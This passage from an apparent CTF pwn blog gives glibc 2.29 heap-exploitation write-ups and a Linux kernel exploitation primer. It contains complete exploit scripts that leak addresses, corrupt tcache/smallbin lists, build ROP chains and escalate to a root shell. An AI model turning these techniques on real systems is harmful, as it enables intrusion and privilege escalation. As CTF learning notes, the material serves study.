//第一次:fake_chunk-&gt;fd被写入libc地址/第二次:fake_chunk-&gt;bk-&gt;fd被写入libc地址 tcache_put (tc_victim, tc_idx); //第一次:将倒数第二个放进smallbin的chunk放入tcache/第二次:将fake_chunk放入tcache中,再次申请出来即可,fd处的libc地址会被覆盖掉(fake_chunk-&gt;bk-&gt;fd处的libc仍然残留) &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125;//在遍历unsortedbin时,找到size正好符合的chunk后,先放入tcache中,继续遍历完毕,遍历完毕后从tcache中取出返回给用户。 在heap的最开始处，会申请一个0x290的chunk来管理所有tcache，也就是tcache_perthread_struct: 1234567891011121314151617181920typedef struct tcache_perthread_struct&#123; uint16_t counts[64]; tcache_entry *entries[64];&#125; tcache_perthread_struct;/*0000000000000000 0000000000000291xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx ========xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx counts,共64个 * 2Bytes = 128/0x80Bytesxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxx ========################ ################ ========........ entries,共64个 * 8Bytes = 521/0x200Bytes################ ################ ========*/ 可以放入tcache中的size(包含chunk_header)范围：0x20(tcache_entry[0])~0x410(tcache_entry[63])的闭区间。 twochunk思路calloc有两个地方需要注意： 不从tcache中取。 取出后内容会清0，不会留下脏数据。 题目限制： 一次malloc(0xE9)的机会 一次malloc(0x88)且可以向其中输入东西的机会 两个放chunk的位置 不限制次数，size限制在0x80~0x3FF之间的calloc的机会 一次打印申请出来chunk前8字节的机会 一次溢出的机会 一次打印name和message的机会 一个函数指针后门 漏洞就是为堆溢出，所以猜测思路应该是篡改next_chunk的fd &amp;&amp; bk，然后在解链时进行攻击。 利用点为：从smallbin中取出一个chunk后，会将剩余chunk解链进入tcache，这个过程的解链是没有自闭检测的，且不用担心因为smallbin被破坏而程序崩掉，因为当tcache满了会自动退出循环。 构造出0x90的tcache中有5个chunk，smallbin中有两个chunk的情形，之后通过溢出改后放入smallbin的chunk的fd &amp;&amp; bk，fd不能动，bk改为指向fake_chunk，fake_chunk的bk需要指向可写的地址，循环结束后的情形为： 0x90的tcache已满，且头部的chunk为fake_chunk 在fake_chunk-&gt;bk处留下了libc的脏数据 泄露+任意地址写即可。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#coding:utf-8from pwn import *path = './twochunk'local = 1attach = 1#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(idx,size): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('idx: ') p.sendline(str(idx)) p.recvuntil('size: ') p.sendline(str(size))def delete(idx): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('idx: ') p.sendline(str(idx))def edit(idx,data): #read(0,ptrlist[idx],size+0x20) p.recvuntil('choice: ') p.sendline('4') p.recvuntil('idx: ') p.sendline(str(idx)) p.recvuntil('content: ') p.send(data)def show(idx): #write(1,ptrlist[idx],8) p.recvuntil('choice: ') p.sendline('3') p.recvuntil('idx: ') p.sendline(str(idx))def backdoor1(): p.recvuntil('choice: ') p.sendline('5') #puts(name) puts(message)def backdoor2(data): p.recvuntil('choice: ') p.sendline('6') p.recvuntil('leave your end message: ') #read(0,malloc(0x88),0x80) p.send(data)def backdoor3(): p.recvuntil('choice: ') p.sendline('7')p.recvuntil('leave your name: ')name = p64(0x23333000+0x20)*6p.send(name)p.recvuntil(': ')message = p64(0x23333000+0x20)*8p.send(message)for i in range(7): #0x190 7 new(0,0x180) delete(0)for i in range(5): #0x90 5 new(0,0x88) delete(0)for i in range(5): #0x100 5 new(1,0xf0) delete(1)new(0,0x180)new(1,0x90) #0xA0delete(1)new(1,0x180)delete(0) #put in unsortedbin size = 0x190new(0,0xf0) #unsortedbin size = 0x90delete(0) #put in tcache size = 0x100(now count = 6)new(0,0x100) #put 0x90 unsortedbin in smallbindelete(1)new(1,0xf0)delete(1)new(1,0x100) #put 0x90 unsortedbin in smallbindelete(0)delete(1)new(0,23333)show(0)heapbase = u64(p.recv(8))-(0x5646cee63560-0x5646cee62000)log.success('heapbase = '+hex(heapbase))#-------------------------------------------------------------target = heapbase + (0x000055555555a650-0x555555559000)payload = '\x00'*0xf0payload+= p64(0)+p64(0x91)payload+= p64(target)+p64(0x23333000-0x10)edit(0,payload)new(1,0x88)backdoor1()p.recvuntil('message: ')libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7ffff7fbec60-0x7ffff7dd4000)log.success('libcbase = '+hex(libcbase))payload = p64(libcbase+libc.sym['system'])+'/bin/sh\x00'payload = payload.ljust(0x30,'\x00')payload+= p64(0x23333008)backdoor2(payload)backdoor3()p.interactive() one_punch_man思路有UAF的话可以直接伪造next_chunk与fake_chunk，需要注意的是fake_chunk-&gt;bk必须是个可写的地址，所以我这里找的是__malloc_hook附近的一个地址。最后改__malloc_hook为gadget，抬栈进行rop。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8from pwn import *path = './one_punch_man'local = 1attach = 1#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(idx,name): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('idx: ') p.sendline(str(idx)) p.recvuntil('name: ') p.send(name)def edit(idx,name): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('idx: ') p.sendline(str(idx)) p.recvuntil('name: ') p.send(name)def show(idx): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('idx: ') p.sendline(str(idx))def delete(idx): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil('idx: ') p.sendline(str(idx))for i in range(5): new(0,'\x00'*0x218) delete(0)show(0)p.recvuntil('hero name: ')heapbase = u64(p.recv(6).ljust(8,'\x00'))-(0x5555555598c0-0x555555559000)log.success('heapbase = '+hex(heapbase))for i in range(7): new(0,'\x00'*0x2a0) delete(0)new(0,'\x00'*0x2a0)new(1,'\x00'*0x80)delete(0)show(0)p.recvuntil('hero name: ')libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7ffff7fb4ca0-0x7ffff7dd0000)log.success('libcbase = '+hex(libcbase))new(1,'\x00'*0x2a0)delete(0)new(0,'\x00'*0x80)new(0,'\x00'*0x230)payload = '\x00'*0x88+p64(0x221)payload+= p64(0)+p64(heapbase+(0x55555555b070-0x555555559000))payload+= p64(0)+p64(0)payload+= p64(heapbase+(0x55555555b050-0x555555559000))+p64(libcbase+(0x7ffff7fb4bf8-0x7ffff7dd0000))edit(1,payload)new(2,'\x00'*0x210)p.recvuntil('&gt; ')p.sendline(str(0xC388))sleep(0.1)p.send('\x00'*0x28+p64(libcbase+0x8cfd6)+'./flag')#0x000000000008cfd6: add rsp, 0x48; ret; #0x0000000000026542: pop rdi; ret; #0x0000000000026f9e: pop rsi; ret; #0x000000000012bda6: pop rdx; ret; #0x0000000000047cf8: pop rax; ret;#0x00000000000cf6c5: syscall; ret; rax = libcbase + 0x0000000000047cf8rdi = libcbase + 0x0000000000026542rsi = libcbase + 0x0000000000026f9erdx = libcbase + 0x000000000012bda6syscall = libcbase + 0x00000000000cf6c5#gdb.attach(p,'b *(0x555555554000+0x139C)')rop = p64(rdi)+p64(libcbase+libc.sym['__malloc_hook']+8)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)rop+= p64(rdi)+p64(3)+p64(rsi)+p64(libcbase+libc.sym['__malloc_hook']-0x80)+p64(rdx)+p64(0x80)+p64(rax)+p64(0)+p64(syscall)rop+= p64(rdi)+p64(1)+p64(rsi)+p64(libcbase+libc.sym['__malloc_hook']-0x80)+p64(rdx)+p64(0x80)+p64(rax)+p64(1)+p64(syscall)new(0,rop)p.interactive() Buu_RedPacket思路当时amain9大佬发给我的时候对2.29不是很感兴趣就没有去花时间研究，现在重新做了一下。。。看了一下之后发现不就是抄的one_punch_man么。。稍微改了改，加了几个吓唬人的检测和限制罢了。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8from pwn import *path = './RedPacket_SoEasyPwn1'local = 1attach = 1#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(idx,size_choice,content): p.recvuntil(': ') p.sendline('1') p.recvuntil('packet idx: ') p.sendline(str(idx)) p.recvuntil('(1.0x10 2.0xf0 3.0x300 4.0x400): ') p.sendline(str(size_choice)) p.recvuntil('put content: ') p.send(content)def delete(idx): p.recvuntil(': ') p.sendline('2') p.recvuntil('packet idx: ') p.sendline(str(idx))def show(idx): p.recvuntil(': ') p.sendline('4') p.recvuntil('packet idx: ') p.sendline(str(idx))def edit(idx,content): p.recvuntil(': ') p.sendline('3') p.recvuntil('packet idx: ') p.sendline(str(idx)) p.recvuntil('put content: ') p.send(content)for i in range(5): new(0,2,'\x00'*0xf0) delete(0)for i in range(7): new(0,4,'\x00'*0x400) delete(0) show(0)heapbase = u64(p.recv(6).ljust(8,'\x00'))-(0x55555555bbc0-0x555555559000)log.success('heapbase = '+hex(heapbase))new(0,4,'\x00'*0x400)new(1,1,'\x00'*0x10)delete(0)show(0)libcbase = u64(p.recv(6).ljust(8,'\x00'))-(0x7ffff7fb4ca0-0x7ffff7dd0000)log.success('libcbase = '+hex(libcbase))new(2,4,'\x00'*0x400)delete(0)new(0,3,'\x00'*0x300) #16rax = libcbase + 0x0000000000047cf8rdi = libcbase + 0x0000000000026542rsi = libcbase + 0x0000000000026f9erdx = libcbase + 0x000000000012bda6syscall = libcbase + 0x00000000000cf6c5flag_addr = heapbase+(0x55555555c8e8-0x555555559000)rop = p64(rdi)+p64(flag_addr)+p64(rdx)+p64(0)+p64(rsi)+p64(0)+p64(rax)+p64(2)+p64(syscall)rop+= p64(rdi)+p64(3)+p64(rsi)+p64(flag_addr+8)+p64(rdx)+p64(0x30)+p64(rax)+p64(0)+p64(syscall)rop+= p64(rdi)+p64(1)+p64(rsi)+p64(flag_addr+8)+p64(rdx)+p64(0x30)+p64(rax)+p64(1)+p64(syscall)rop+= './flag'+'\x00'new(0,3,rop) #17payload = '\x00'*0x300payload+= p64(0)+p64(0x101)payload+= p64(0)+p64(heapbase+(0x55555555c700-0x555555559000))payload+= p64(0)+p64(0)payload+= p64(heapbase+(0x55555555c6e0-0x555555559000))+p64(heapbase+(0x55555555c720-0x555555559000))payload+= p64(0)+p64(0)payload+= p64(0)+p64(heapbase+(0x555555559a50-0x555555559000))edit(2,payload)new(1,2,'\x00')p.recvuntil(': ')p.sendline('666')p.recvuntil('What do you want to say?')#0x0000000000058373: leave; ret; leave = libcbase + 0x58373payload = '\x11'*0x80+p64(heapbase+(0x55555555c810-0x555555559000)-8)+p64(leave)p.send(payload)p.interactive() PlainNote其他fastbin &amp;&amp; unsortedbin &amp;&amp; topchunk 在main_arena中的位置。 12345678910111213141516171819202122232425gdb-peda$ heapinfo(0x20) fastbin[0]: 0x602110 --&gt; 0x0(0x30) fastbin[1]: 0x0(0x40) fastbin[2]: 0x0(0x50) fastbin[3]: 0x0(0x60) fastbin[4]: 0x0(0x70) fastbin[5]: 0x0(0x80) fastbin[6]: 0x602090 --&gt; 0x0(0x90) fastbin[7]: 0x0(0xa0) fastbin[8]: 0x0(0xb0) fastbin[9]: 0x0 top: 0x602130 (size : 0x20ed0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x602000 (size : 0x90)gdb-peda$ p &amp;main_arena$1 = (struct malloc_state *) 0x7ffff7dd1b20 &lt;main_arena&gt;gdb-peda$ x/80xg 0x7ffff7dd1b200x7ffff7dd1b20 &lt;main_arena&gt;: 0x0000000000000000 0x00000000006021100x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000006020900x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000 0x00000000006021300x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000 0x00000000006020000x7ffff7dd1b90 &lt;main_arena+112&gt;: 0x0000000000602000 unsortedbin &amp;&amp; smallbin的连接和进出方式：]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>summary</tag>
        <tag>Glibc2.29_up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinuxKernel初识]]></title>
    <url>%2F2020%2F04%2F20%2FLinuxKernel%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[前言：kernel算是glibc和virtual之间的过渡吧，想学好虚拟化，内核基础必须要扎实，所以这一部分花的时间也算挺长的。但收获也确实很大。记录下自己从零开始大概两周时间的学习内容。 pwn中kernel题的常规套路：给三个东西：start.sh，rootfs.cpio，bzImage。 用extract-vmlinux.sh脚本提取出vmlinux===&gt; command: ./extract-vmlinux.sh ./bzImage &gt; vmlinux，需要注意的是这样提取出来的vmlinux是无符号表的，所以无法用offset = hex(vmlinux.sym[&#39;func_name&#39;] - raw_vmlinux_base)来寻找某个函数的相对偏移。 ropper提取出vmlinux中的gadgets ===&gt; command: ropper --file ./vmlinux --nocolor &gt; gadgets 大约两分半可以跑完。 然后解包rootfs.cpio后查看init文件一般会将漏洞模块加载到内核中去。我们把这个ko文件取出来放进ida逆向，寻找漏洞，之后调试也大部分是调试漏洞模块中的自定义函数。 其实说白了，我个人觉得，ko文件就等同于是glibcpwn中的binary文件，vmlinux就等同于是glibcpwn中的libc。跟glibcpwn中的binary文件加载后的基址，libc加载后的基址一样，ko文件加载后的基址，vmlinux加载后的基址也同样非常地重要，也很容易理解。。。因为有了基址才有了一切functions和gadgets的地址，才可以劫持执行流。 所以。。。怎样泄露基址是一个关键点。 前置知识：对一些重要结构体和函数的理解：FOP( File_Operations )：这个结构体和之后的函数是理解为什么我们在exp调用open/close/read/write这些系统调用时内核就会调用内核模块中的自定义函数的关键点。 源码如下：不同版本的内核，结构与成员不同，需自己查阅 1234567891011121314151617181920212223242526272829303132333435363738394041struct file_operations &#123; struct module *owner; loff_t (*llseek) (struct file *, loff_t, int); ssize_t (*read) (struct file *, char __user *, size_t, loff_t *); ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *); ssize_t (*read_iter) (struct kiocb *, struct iov_iter *); ssize_t (*write_iter) (struct kiocb *, struct iov_iter *); int (*iopoll)(struct kiocb *kiocb, bool spin); int (*iterate) (struct file *, struct dir_context *); int (*iterate_shared) (struct file *, struct dir_context *); __poll_t (*poll) (struct file *, struct poll_table_struct *); long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); long (*compat_ioctl) (struct file *, unsigned int, unsigned long); int (*mmap) (struct file *, struct vm_area_struct *); unsigned long mmap_supported_flags; int (*open) (struct inode *, struct file *); int (*flush) (struct file *, fl_owner_t id); int (*release) (struct inode *, struct file *); int (*fsync) (struct file *, loff_t, loff_t, int datasync); int (*fasync) (int, struct file *, int); int (*lock) (struct file *, int, struct file_lock *); ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); int (*check_flags)(int); int (*flock) (struct file *, int, struct file_lock *); ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); int (*setlease)(struct file *, long, struct file_lock **, void **); long (*fallocate)(struct file *file, int mode, loff_t offset, loff_t len); void (*show_fdinfo)(struct seq_file *m, struct file *f);#ifndef CONFIG_MMU unsigned (*mmap_capabilities)(struct file *);#endif ssize_t (*copy_file_range)(struct file *, loff_t, struct file *, loff_t, size_t, unsigned int); loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in, struct file *file_out, loff_t pos_out, loff_t len, unsigned int remap_flags); int (*fadvise)(struct file *, loff_t, loff_t, int);&#125; __randomize_layout; Linux使用File_Operations结构访问驱动程序的函数，这个结构的每一个成员的名字都对应着一个调用。 用户进程利用在对设备文件进行诸如open/close/read/write操作的时候，系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。 proc_create创建文件：proc_create函数会在/proc目录下创建一个虚拟文件，之后我们可用自定义的fop与其绑定，然后我们就可通过对这个虚拟文件的操作来调用自定义的内核模块函数了。等于打通了内核态和用户态的交互。 比如说一个驱动程序在init中执行了proc_create(&quot;core&quot;, 0x1B6LL, 0LL, &amp;core_fops)，文件名是core，而且在core_fops中绑定了自定义的ioctl，那么其他用户程序就可以先fopen这个core获取文件指针fd，然后执行ioctl(fd,&lt;参数&gt;,&lt;参数&gt;)来进行对自定义ioctl的调用，其他的fop中的回调接口函数也类似。 kptr_restrict 与dmesg_restrict： 在Linux内核漏洞利用中常常使用commit_creds和prepare_kernel_cred来完成提权（这两个函数可以存在于vmlinux中，可以类比于libc中的库函数）它们的地址可以从/proc/kallsyms中读取。将/proc/sys/kernel/kptr_restrict设置为1可阻止通过这种方式泄露内核地址。(默认就是设为1，只有root用户可查看) dmesg命令可以显示内核的环形缓冲区信息，kprintf打印的信息都可以用此命令查看，将/proc/sys/kernel/dmesg_restrict设为1可限制非root用户无法读dmesg（Restrict unprivileged access to kernel syslog）。 关于基址：123456789101112bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; vmlinux = ELF("./vmlinux")[*] '/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli'Arch: amd64-64-littleRELRO: No RELROStack: Canary foundNX: NX disabledPIE: No PIE (0xffffffff81000000)RWX: Has RWX segments&gt;&gt;&gt; hex(vmlinux.sym['commit_creds'] - 0xffffffff81000000)'0x9c8e0' 几个量： raw_vmlinux_base ：0xffffffff81000000 ===&gt; vmlinux静态文件中的基址，可直接查看。 func_offset：vmlinux.sym[&#39;func_name&#39;] - raw_vmlinux_base ===&gt; vmlinux中func函数相对文件开头的偏移。这个vmlinux必须得有符号表，自己导出的不可。 动态运行时函数与基址的关系：vmlinux_base = func_addr - func_offset vmlinux_base和func_addr需要通过漏洞来泄露其中一个，当然能直接看那就无所谓了orz。 关于gdb+qemu调试：至于在文件系统里怎么写就不细说了，网上都找的到的。。。加个-s即可（-gdb tcp::1234的缩写）-S看习惯，是让qemu在最开始卡住。 我自己的常规流程：qemu内： 启动，这时是root用户 查看加载的ko模块的基址 切换到普通用户，假装什么都没发生 qemu外，gdb内： gdb -q ./vmlinux add-symbol-file ./xxxx/ko ko模块基址 b 模块函数 target remote localhost:1234/:1234 c qemu内： 运行exp qemu外，gdb内： 会卡在之前断下的函数的入口，然后按自己想下断点的地方继续下断点调试。 确定ko模块基址：就像我之前说的，ko文件就是binary文件，vmlinux就相当于libc文件。 所以知道ko文件在内核空间的地址是一件很重要的事情，没有这个地址的话我们将无法运行add-symbols-file ./your_module.ko 0xffffffffxxxxxxxx命令来加载模块的符号表，也就没法在模块自定义函数下断点，也就是没法调试。 查看这个地址有很多办法： cat /sys/module/your_module/sections/.text cat /proc/modules lsmod 但是不幸的是都需要root权限才能查看。。。(lsmod非root情况下使用显示地址为全0。) 好在因为我们是在本地操作，所以我们可以先在文件系统的init文件里将setuidgid 1000 /bin/sh改为setuidgid 0 /bin/sh，就可以以root用户启动qemu，我们查看到ko基址之后再切换到普通用户即可，所有的用户的所有信息在/etc/passwd下都可看到，可自己查看，一般都有一个普通用户（uid = 1000），一个root用户（uid = 0）。我们在root用户时输入:su - 普通用户的名字即可切换到普通用户，之后就可以装作是以普通用户登录的一样来搞事情，测试exp等。。。 2017CSICN_babydriver:还是以学习知识为主，做题为此要，基础扎实最重要。 init里先注册了一个字符设备文件: babydev。 关于编写字符设备驱动一系列函数可参考： https://zhuanlan.zhihu.com/p/73974707 https://www.jianshu.com/p/3c917de2925c https://www.jianshu.com/p/1a18267bc00e https://www.jianshu.com/p/767f75efc495 https://blog.csdn.net/tanyjin/article/details/51705530 解法一：UAF exp：12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int main()&#123; int fd1 = open("/dev/babydev",2); int fd2 = open("/dev/babydev",2); ioctl(fd1,0x10001,0xa8); close(fd1); int id = fork(); if(id &lt; 0)&#123; puts("[:(]fork error!!!"); exit(0); &#125; else if(id == 0)&#123; char buf[30] = &#123;0&#125;; write(fd2,buf,28); if(getuid() == 0)&#123; puts("[:)]root now!!!"); system("/bin/sh"); exit(0); &#125; &#125; else&#123; wait(NULL); &#125; close(fd2); return 0;&#125; 解法二：By pass Smep &amp; ret2usr exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;pty.h&gt;#include &lt;sys/ipc.h&gt; #include &lt;sys/sem.h&gt;size_t prepare_kernel_cred = 0xffffffff810a1810;size_t commit_creds = 0xffffffff810a1420;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;void get_root()&#123; char* (*pkc)(int) = prepare_kernel_cred; void (*cc)(char*) = commit_creds; (*cc)((*pkc)(0));&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;int main()&#123; save(); int fd1 = open("/dev/babydev",2); int fd2 = open("/dev/babydev",2); ioctl(fd1,0x10001,0x2e0); close(fd1); size_t mov_cr4 = 0xFFFFFFFF810635B4; //mov cr4,rdi;pop rbp;retn; size_t mov_rsp = 0xFFFFFFFF8181BFC5; //mov rsp,rax;dec ebx;ret; size_t swapgs = 0xffffffff81063694; //swapgs;pop rbp;ret; size_t pop_rdi = 0xffffffff810d238d; //pop rdi;ret; size_t iretq = 0xffffffff814e35ef; //iretq;ret; size_t pop_rsp = 0xffffffff81171045; //pop rsp;ret; size_t ropchain[30] = &#123;0&#125;; int i = 0; ropchain[i++] = pop_rdi; ropchain[i++] = 0x6f0; ropchain[i++] = mov_cr4; ropchain[i++] = 0; ropchain[i++] = (size_t)get_root; ropchain[i++] = swapgs; ropchain[i++] = 0; ropchain[i++] = iretq; ropchain[i++] = (size_t)get_shell; ropchain[i++] = user_cs; ropchain[i++] = user_rflags; ropchain[i++] = user_rsp; ropchain[i++] = user_ss; size_t fake_tty_struct[4] = &#123;0&#125;; size_t fake_tty_operations[32] = &#123;0&#125;; fake_tty_operations[0] = pop_rsp; fake_tty_operations[1] = (size_t)ropchain; fake_tty_operations[7] = mov_rsp; int fd_tty = open("/dev/ptmx",2); read(fd2,fake_tty_struct,0x20); fake_tty_struct[3] = (size_t)fake_tty_operations; write(fd2,fake_tty_struct,0x20); char buf[8] = &#123;0&#125;; write(fd_tty,buf,8); return 0;&#125; 2018强网杯_core：解法一：kernel space ROP exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;size_t vmlinux_base = 0;size_t commit_creds_addr = 0;size_t prepare_kernel_cred_addr = 0;void get_symbols()&#123; FILE* fp = fopen("/tmp/kallsyms","r"); if(fp &lt; 0)&#123; puts("[:(]Open kallsyms error!"); exit(0); &#125; char buf[0x30] = &#123;0&#125;; while(fgets(buf, 0x30, fp))&#123; if(commit_creds_addr &amp; prepare_kernel_cred_addr)&#123; break; &#125; if(strstr(buf,"commit_creds") &amp;&amp; !commit_creds_addr)&#123; char addr1[20] = &#123;0&#125;; strncpy(addr1,buf,16); sscanf(addr1,"%llx",&amp;commit_creds_addr); printf("[:)]commit_creds addr = %p\n",commit_creds_addr); &#125; if(strstr(buf,"prepare_kernel_cred") &amp;&amp; !prepare_kernel_cred_addr)&#123; char addr2[20] = &#123;0&#125;; strncpy(addr2,buf,16); sscanf(addr2,"%llx",&amp;prepare_kernel_cred_addr); printf("[:)]prepare_kernel_cred addr = %p\n",prepare_kernel_cred_addr); vmlinux_base = prepare_kernel_cred_addr - 0x9cce0; printf("[:)]vmlinux_base = %p\n",vmlinux_base); &#125; &#125; if(!(commit_creds_addr &amp; prepare_kernel_cred_addr))&#123; puts("[:(]Don't find!!!"); exit(0); &#125; fclose(fp);&#125;size_t user_ss,user_cs,user_rflags,user_rsp;void save()&#123; __asm__( "mov user_ss,ss;" "mov user_cs,cs;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Status has been saved!!!");&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]get root failed..."); exit(0); &#125;&#125;void set_offset(int fd, size_t offset)&#123; ioctl(fd,0x6677889C,offset); puts("[:)]Set offset!!!");&#125;void Read(int fd, char buf[])&#123; ioctl(fd,0x6677889B,buf); puts("[:)]Read!!!");&#125;void copy_func(int fd, signed long long size)&#123; ioctl(fd,0x6677889A,size); puts("[:)]Copy_data!!!");&#125;int main()&#123; save(); get_symbols(); int fd = open("/proc/core",2); if(fd &lt; 0)&#123; puts("[:(]Open /proc/core failed!!!"); exit(0); &#125; set_offset(fd, 0x40); char buf[0x40] = &#123;0&#125;; Read(fd, buf); size_t canary = *(size_t *)buf; printf("[:)]Canary = %llx\n",canary); size_t ropchain[100] = &#123;0&#125;; size_t pop_rdi = vmlinux_base + (0xffffffff81000b2f-0xffffffff81000000); size_t mov_call = vmlinux_base + (0xffffffff8101aa6a-0xffffffff81000000); //0xffffffff8101aa6a: mov rdi, rax; call rdx; size_t pop_rdx = vmlinux_base + (0xffffffff810a0f49-0xffffffff81000000); size_t pop_rcx = vmlinux_base + (0xffffffff81021e53-0xffffffff81000000); size_t swapgs = vmlinux_base + (0xffffffff81a012da-0xffffffff81000000); //: swapgs; popfq; ret; size_t iretq = vmlinux_base + (0xffffffff81050ac2-0xffffffff81000000); //: iretq; ret; int i = 0; for(i = 0;i &lt; 8;i++)&#123; ropchain[i] = 0; &#125; ropchain[i++] = canary; ropchain[i++] = 0; ropchain[i++] = pop_rdi; ropchain[i++] = 0; ropchain[i++] = prepare_kernel_cred_addr; ropchain[i++] = pop_rdx; ropchain[i++] = pop_rcx; ropchain[i++] = mov_call; ropchain[i++] = commit_creds_addr; ropchain[i++] = swapgs; ropchain[i++] = 0; ropchain[i++] = iretq; ropchain[i++] = (size_t)get_shell; ropchain[i++] = user_cs; ropchain[i++] = user_rflags; ropchain[i++] = user_rsp; ropchain[i++] = user_ss; write(fd,ropchain,0x800); copy_func(fd,0xffffffffffff0000|0x0100); return 0;&#125;/*&gt;&gt;&gt; hex(p.sym['commit_creds']-0xffffffff81000000)'0x9c8e0'&gt;&gt;&gt; hex(p.sym['prepare_kernel_cred']-0xffffffff81000000)'0x9cce0'*/ 解法二：ret2usr exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;size_t vmlinux_base = 0;size_t commit_creds_addr = 0;size_t prepare_kernel_cred_addr = 0;void get_symbols()&#123; FILE* fp = fopen("/tmp/kallsyms","r"); if(fp &lt; 0)&#123; puts("[:(]Open kallsyms error!"); exit(0); &#125; char buf[0x30] = &#123;0&#125;; while(fgets(buf, 0x30, fp))&#123; if(commit_creds_addr &amp; prepare_kernel_cred_addr)&#123; break; 